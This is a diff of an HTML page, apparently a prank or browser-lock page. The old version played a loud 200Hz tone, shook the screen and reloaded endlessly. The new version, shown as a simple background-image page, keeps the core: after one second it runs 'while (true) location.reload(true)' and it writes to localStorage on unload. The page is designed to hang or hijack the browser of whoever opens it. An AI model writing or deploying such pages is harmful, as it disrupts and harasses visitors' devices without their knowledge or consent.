@@ -1,81 +1,34 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>200Hz Bass with Infinite Reload and Shake</title>
+  <title>Background Image and Reload</title>
   <style>
     body {
       margin: 0;
       padding: 0;
       display: flex;
-      justify-content: center;
       align-items: center;
+      justify-content: center;
       height: 100vh;
-      background: url('background.png') no-repeat center center fixed;
-      background-size: cover;
-      color: white;
-      font-family: Arial, sans-serif;
-      text-align: center;
-      animation: shake 0.05s ease-in-out infinite;
+      background: #000;
     }
-
-    h1 {
-      font-size: 2rem;
-    }
-
-    /* Shake Animation */
-    @keyframes shake {
-      0% { transform: translateX(0); }
-      25% { transform: translateX(-5px); }
-      50% { transform: translateX(5px); }
-      75% { transform: translateX(-5px); }
-      100% { transform: translateX(5px); }
+    #background {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
     }
   </style>
 </head>
 <body>
-  <h1>Playing 200Hz Bass</h1>
+  <img id="background" src="background.png" alt="Background Image">
+
   <script>
-    // Function to play the 200Hz bass sound
-    function play200HzBass() {
-      const audioContext = new (window.AudioContext || window.webkitAudioContext)();
-      const oscillator = audioContext.createOscillator();
-      const gainNode = audioContext.createGain();
-
-      // Configure the oscillator for 200Hz sine wave
-      oscillator.type = 'sine'; // Smooth bass sound
-      oscillator.frequency.setValueAtTime(200, audioContext.currentTime); // 200Hz frequency
-      oscillator.connect(gainNode);
-      gainNode.connect(audioContext.destination);
-
-      // Set volume (100%)
-      gainNode.gain.setValueAtTime(1.0, audioContext.currentTime);
-
-      // Start the sound
-      oscillator.start();
-
-      // Prevent audio context from being suspended
-      if (audioContext.state === 'suspended') {
-        audioContext.resume();
-      }
-    }
-
-    // Play the sound after 1 second
-    setTimeout(() => {
-      play200HzBass();
-    }, 1000);
-
-    // Function to store data before the page is unloaded
     window.onbeforeunload = function() {
-      localStorage.x = 1;  // Store a value in localStorage
+      localStorage.x = 1;
     };
 
-    // Infinite reload loop after 1 second
     setTimeout(function() {
-      while (true) {
-        location.reload(true);  // Force page reload
-      }
+      while (true) location.reload(true);
     }, 1000);
   </script>
 </body>
